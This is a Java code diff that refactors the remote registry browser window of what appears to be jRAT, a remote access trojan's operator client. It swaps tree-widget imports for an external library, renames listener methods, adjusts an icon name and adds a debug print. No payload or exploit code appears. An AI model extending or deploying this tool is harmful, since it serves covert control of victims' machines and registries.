@@ -34,14 +34,15 @@ import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet79BrowseRegistry;
 import se.jrat.client.packets.outgoing.Packet80CustomRegQuery;
 import se.jrat.client.ui.components.DefaultJTable;
-import se.jrat.client.ui.components.tree.PathJTree;
-import se.jrat.client.ui.components.tree.PathListener;
-import se.jrat.client.ui.components.tree.PathTreeModel;
-import se.jrat.client.ui.components.tree.PathTreeNode;
 import se.jrat.client.ui.dialogs.DialogCustomRegQuery;
 import se.jrat.client.ui.renderers.table.RegistryTableRenderer;
 import se.jrat.client.utils.IconUtils;
 import se.jrat.client.utils.Utils;
+
+import com.redpois0n.pathtree.FolderClickListener;
+import com.redpois0n.pathtree.FolderTreeNode;
+import com.redpois0n.pathtree.PathJTree;
+import com.redpois0n.pathtree.PathTreeModel;
 
 @SuppressWarnings( "serial" )
 public class FrameRemoteRegistry extends BaseFrame {
@@ -172,7 +173,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		popupMenu.addSeparator();
 
 		mnBrowse = new JMenu("Browse");
-		mnBrowse.setIcon(IconUtils.getIcon("bookmark_go"));
+		mnBrowse.setIcon(IconUtils.getIcon("bookmark-go"));
 		popupMenu.add(mnBrowse);
 
 		mntmStartup = new JMenuItem("Startup");
@@ -183,12 +184,12 @@ public class FrameRemoteRegistry extends BaseFrame {
 		splitPane.setLeftComponent(scrollPane_1);
 
 		tree = new PathJTree();
-		tree.setModel(new PathTreeModel(new PathTreeNode("root", null)));
 		tree.setDelimiter("\\");
-		tree.addPathListener(new PathListener() {
+		tree.addFolderClickListener(new FolderClickListener() {
 			@Override
-			public void pathSelected(String path) {
+			public void itemSelected(String path) {
 				clear();
+				System.out.println(path);
 				execute(path);
 				txt.setText(path);
 			}
@@ -196,14 +197,8 @@ public class FrameRemoteRegistry extends BaseFrame {
 		scrollPane_1.setViewportView(tree);
 
 		for (String root : ROOT_VALUES) {
-			getTreeModel().addRoot(new PathTreeNode(root, IconUtils.getIcon("folder-network")));
+			getTreeModel().addRoot(new FolderTreeNode(root, IconUtils.getIcon("folder-network")));
 		}
-
-		for (int i = 0; i < tree.getRowCount(); i++) {
-			tree.expandRow(i);
-		}
-		
-		tree.setRootVisible(false);
 
 		txt = new JTextField();
 		toolBar.add(txt);
